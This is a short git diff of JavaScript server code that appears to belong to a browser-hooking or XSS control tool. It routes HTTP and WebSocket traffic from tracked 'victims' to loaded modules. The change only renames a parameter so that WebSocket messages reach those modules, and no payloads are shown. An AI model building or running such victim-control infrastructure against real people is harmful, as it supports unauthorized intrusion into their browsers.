@@ -42,7 +42,7 @@ function online(who, on){
         });
     });
 };
-function handle(req, res, modules, owner, victim, who, type){
+function handle(req, res, modules, owner, victim, who, msg){
     var share = {};
     var path = fs.realpathSync('.');
     for(var i in modules){
@@ -57,7 +57,7 @@ function handle(req, res, modules, owner, victim, who, type){
             continue
         };
         share[modules[i][0]].unshift(
-            m({q:req, s:res}, {v:victim, w:who}, {p:modules[i][1], s:share}, {o:owner, t:type})
+            m({q:req, s:res}, {v:victim, w:who}, {p:modules[i][1], s:share}, {o:owner, g:msg})
         );
     };
 };
@@ -69,7 +69,7 @@ var http = function(req, res){
         if(!info)return err404(req, res);
         var owner = req.session.user&&(req.session.user.name == info.owner);
         !owner&&online(who, Date.now());
-        handle(req, res, info.modules, owner, sql.Victim, who, 'http');
+        handle(req, res, info.modules, owner, sql.Victim, who, null);
     });
 };
 router.all('/h/:uri', http);
@@ -88,7 +88,7 @@ exports.ws = function(ws, req){
             return !owner&&online(who, Date.now());
         });
         ws.on('message', function(msg){
-            handle(req, ws, info.modules, owner, sql.Victim, who, 'ws');
+            handle(req, ws, info.modules, owner, sql.Victim, who, msg);
         });
     });
 };
